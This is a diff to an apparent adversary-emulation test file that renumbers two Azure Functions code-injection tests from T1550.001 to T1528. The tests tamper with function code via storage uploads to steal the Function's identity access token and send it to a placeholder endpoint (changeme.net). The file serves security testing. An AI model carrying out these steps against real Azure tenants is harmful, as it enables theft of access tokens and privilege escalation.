@@ -1,5 +1,5 @@
-attack_technique: T1550.001
-display_name: 'Use Alternate Authentication Material: Application Access Token'
+attack_technique: T1528
+display_name: 'Steal Application Access Token'
 atomic_tests:
 - name: Azure - Functions code upload - Functions code injection via Blob upload
   auto_generated_guid: 9a5352e4-56e5-45c2-9b3f-41a46d3b3a43
@@ -8,11 +8,11 @@ atomic_tests:
 
     Attack idea/reference: https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/
 
-    Similar to T1550.001 "Azure - Functions code upload - Functions code injection to retrieve the Functions identity access token", the depicted code injection scenario tampers the source code of Azure Functions to perform Subscription Privilege Escalation by retrieving the identity access token of an Azure functions instance. In this case, the prepared zip file (underlying package for a Function) is expected to contain the tampered function presented in src/code_to_insert.py. Note that the endpoint https://changeme.net needs to be adapted in your packed function code.
+    Similar to T1528 "Azure - Functions code upload - Functions code injection to retrieve the Functions identity access token", the depicted code injection scenario tampers the source code of Azure Functions to perform Subscription Privilege Escalation by retrieving the identity access token of an Azure functions instance. In this case, the prepared zip file (underlying package for a Function) is expected to contain the tampered function presented in src/code_to_insert.py. Note that the endpoint https://changeme.net needs to be adapted in your packed function code.
 
     Note:
     - The Azure Function modified in this test must be hosted via Azure Blob storage (Info on storage considerations for Azure Function: https://learn.microsoft.com/en-us/azure/azure-functions/storage-considerations). 
-    - For Function code upload to Azure Functions that are hosted via Azure Files in a File Share, refer to T1550.001 "Azure - Functions code upload - Functions code injection to retrieve the Functions identity access token".
+    - For Function code upload to Azure Functions that are hosted via Azure Files in a File Share, refer to T1528 "Azure - Functions code upload - Functions code injection to retrieve the Functions identity access token".
     - The required input fields can be retrieved in a reconnaissance step in test T1619 "Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI". The code of function apps may be inspected and prepared from the result of test T1530 "Azure - Dump Azure Storage Account Objects via Azure CLI".
 
     Requirements:
@@ -35,7 +35,7 @@ atomic_tests:
       description: Name of the function blob
     file_path_blob:
       type: path
-      default: $env:temp/T1550.001_function_code.zip
+      default: $env:temp/T1528_function_code.zip
       description: Path to the function code file to upload as blob
   dependency_executor_name: powershell
   dependencies:
@@ -54,7 +54,7 @@ atomic_tests:
           $connectionString = az storage account show-connection-string --name "#{storage_account_name}" --query connectionString --output tsv
 
           # Download blob for cleanup
-          $tmpOriginalFunctionCode = Join-Path $env:temp/ ("T1550.001_tmp_original_" + "#{blob_name}")
+          $tmpOriginalFunctionCode = Join-Path $env:temp/ ("T1528_tmp_original_" + "#{blob_name}")
           az storage blob download --connection-string $connectionString --container-name "#{container_name}" --name "#{blob_name}" --file $tmpOriginalFunctionCode --overwrite true
 
           if ($LASTEXITCODE -eq 0) {
@@ -69,7 +69,7 @@ atomic_tests:
       az login    # Log in to Azure CLI
 
       # Upload previous funciton code
-      $tmpOriginalFunctionCode = Join-Path $env:temp/ ("T1550.001_tmp_original_" + "#{blob_name}")
+      $tmpOriginalFunctionCode = Join-Path $env:temp/ ("T1528_tmp_original_" + "#{blob_name}")
       az storage blob upload --account-name "#{storage_account_name}" --container-name "#{container_name}" --file $tmpOriginalFunctionCode --name "#{blob_name}" --overwrite true 2>$null
 
       if ($LASTEXITCODE -eq 0) {
@@ -94,7 +94,7 @@ atomic_tests:
 
     Note: 
     - The Azure Function modified in this test must be hosted via Azure Files in a File Share (Info on storage considerations for Azure Function: https://learn.microsoft.com/en-us/azure/azure-functions/storage-considerations).
-    - For Function code upload to Azure Functions that are hosted via Azure Blob storage, refer to T1550.001 "Azure - Functions code upload - Functions code injection via Blob upload".
+    - For Function code upload to Azure Functions that are hosted via Azure Blob storage, refer to T1528 "Azure - Functions code upload - Functions code injection via Blob upload".
     - The required input fields can be retrieved in a reconnaissance step in test T1619 "Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI". The code of function apps may be inspected and prepared from the result of test T1530 "Azure - Dump Azure Storage Account Objects via Azure CLI".
     - Important: Change the https://changeme.net in code_to_insert_path to a self-controlled endpoint. This endpoint can be hosted e.g. as request bin via Pipedream to display the body of incoming POST requests.
     - The default injected code to retrieve the access token can be replaced by arbitrary other code. In this case: Replace the code defined in code_to_insert_path
@@ -127,7 +127,7 @@ atomic_tests:
       description: Path to the Function file in the file share
     code_to_insert_path:
       type: path
-      default: $PathToAtomicsFolder/T1550.001/src/code_to_insert.py
+      default: $PathToAtomicsFolder/T1528/src/code_to_insert.py
       description: The code that will be injected into the Function
   dependency_executor_name: powershell
   dependencies:
@@ -145,14 +145,14 @@ atomic_tests:
       } else {
           # Download file for cleanup
           $tmpOriginalFileName = [System.IO.Path]::GetFileName("#{file_path}")
-          $tmpOriginalFunctionCode = Join-Path $env:temp/ ("T1550.001_tmp_original_" + $tmpOriginalFileName)
+          $tmpOriginalFunctionCode = Join-Path $env:temp/ ("T1528_tmp_original_" + $tmpOriginalFileName)
           az storage file download --account-name "#{storage_account_name}" --share-name "#{file_share_name}" -p "#{file_path}" --only-show-errors --dest $tmpOriginalFunctionCode
 
           if ($LASTEXITCODE -eq 0) {
               # Upload new funciton code if download of existing code succeeded
               if ("#{execution_option}" -eq "insert_code") {
                   # Download file from file share for injection
-                  $tmpFunctionCode = Join-Path $env:temp/ ("T1550.001_tmp_to_inject_" + $tmpOriginalFileName)
+                  $tmpFunctionCode = Join-Path $env:temp/ ("T1528_tmp_to_inject_" + $tmpOriginalFileName)
                   az storage file download --account-name "#{storage_account_name}" --share-name "#{file_share_name}" -p "#{file_path}" --only-show-errors --dest $tmpFunctionCode
                   
                   if ($LASTEXITCODE -ne 0) {
@@ -195,7 +195,7 @@ atomic_tests:
 
       # Upload previous funciton code
       $tmpOriginalFileName = [System.IO.Path]::GetFileName("#{file_path}")
-      $tmpOriginalFunctionCode = Join-Path $env:temp/ ("T1550.001_tmp_original_" + $tmpOriginalFileName)
+      $tmpOriginalFunctionCode = Join-Path $env:temp/ ("T1528_tmp_original_" + $tmpOriginalFileName)
       az storage file upload --account-name "#{storage_account_name}" --share-name "#{file_share_name}" -p "#{file_path}" --source $tmpOriginalFunctionCode --only-show-errors 2>$null
 
       if ($LASTEXITCODE -eq 0) {
@@ -203,7 +203,7 @@ atomic_tests:
 
           # Delete tmp original f file if upload succeeded
           if ("#{execution_option}" -eq "insert_code") {
-              $tmpFunctionCode = Join-Path $env:temp/ ("T1550.001_tmp_to_inject_" + $tmpOriginalFileName)
+              $tmpFunctionCode = Join-Path $env:temp/ ("T1528_tmp_to_inject_" + $tmpOriginalFileName)
               Remove-Item -Path $tmpFunctionCode -Force -erroraction silentlycontinue
               Write-Output "Deleted tmp file: $($tmpFunctionCode)"
           }
